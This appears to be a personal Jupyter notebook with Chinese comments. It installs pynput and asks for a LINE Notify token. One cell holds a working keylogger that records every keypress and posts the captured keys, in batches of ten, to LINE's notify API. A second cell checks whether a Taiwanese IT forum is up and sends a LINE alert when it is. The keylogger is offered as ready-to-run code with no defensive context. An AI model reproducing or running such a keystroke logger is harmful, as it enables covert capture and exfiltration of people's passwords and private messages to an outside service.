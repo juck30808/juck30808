{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "926a5f30",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.7.6-py2.py3-none-any.whl (89 kB)\n",
      "Requirement already satisfied: six in c:\\users\\cti110016\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.6\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "942e249b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import getpass\n",
    "inpwd = getpass.getpass('API key：')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "305b1d8b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from pynput import keyboard\n",
    "\n",
    "times = 0\n",
    "char_list = []\n",
    "\n",
    "def on_press(key):\n",
    "    global times\n",
    "    global char_list\n",
    "    try:\n",
    "        char_list.append(key.char[0])\n",
    "        times += 1\n",
    "        if times == 10: # 這邊設定每十個字傳一條訊息，不然訊息太多會塞車\n",
    "            headers = {\n",
    "            \"Authorization\": \"Bearer \" + inpwd,\n",
    "            }\n",
    "    \n",
    "            params = {\"message\": char_list,} \n",
    "            r = requests.post(\"https://notify-api.line.me/api/notify\",\n",
    "                                    headers=headers, params=params)\n",
    "            char_list = []\n",
    "            times = 0\n",
    "        \n",
    "    except AttributeError:\n",
    "        if key == keyboard.Key.esc: # 按ESC就停止程式，不停也可以啦\n",
    "            return False\n",
    "        char_list.append(key)\n",
    "        times += 1\n",
    "        if times == 10:\n",
    "            headers = {\n",
    "            \"Authorization\": \"Bearer \" + inpwd,\n",
    "            }\n",
    "    \n",
    "            params = {\"message\": char_list,} \n",
    "            r = requests.post(\"https://notify-api.line.me/api/notify\",\n",
    "                                    headers=headers, params=params)\n",
    "            char_list = []\n",
    "            times = 0\n",
    "        \n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc: # Stop function: ESC\n",
    "        return False\n",
    "\n",
    "with keyboard.Listener(\n",
    "        on_press=on_press,\n",
    "        on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee091853",
   "metadata": {},
   "source": [
    "## Detect web"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8c13b177",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import time\n",
    "\n",
    "while 1:\n",
    "    try:\n",
    "        r = requests.head(\"https://ithelp.ithome.com.tw\")\n",
    "        print(r.status_code) # 印出http code\n",
    "        if r.status_code == 200 : # status code 200代表網頁正常\n",
    "            headers = {\n",
    "            \"Authorization\": \"Bearer \" + inpwd,\n",
    "            }\n",
    "     \n",
    "            params = {\"message\": \"可以發文囉!\",    \n",
    "                  \"stickerPackageId\" : 8525,    #stickerPackageId\n",
    "                  \"stickerId\" : 16581292        #stickerId\n",
    "            }\n",
    "\n",
    "            r = requests.post(\"https://notify-api.line.me/api/notify\",\n",
    "                          headers=headers, params=params)  \n",
    "            break\n",
    "        else:\n",
    "            print(\"還不能發文喔\")\n",
    "            time.sleep(5)\n",
    "    except:\n",
    "        print(\"無法連上網站，網址可能錯誤\")\n",
    "        time.sleep(5)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "86a7e429",
   "metadata": {},
   "source": [
    "- https://developers.line.biz/en/docs/messaging-api/sticker-list/#sticker-definitions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07face8f",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f62e284",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f412a1fd",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
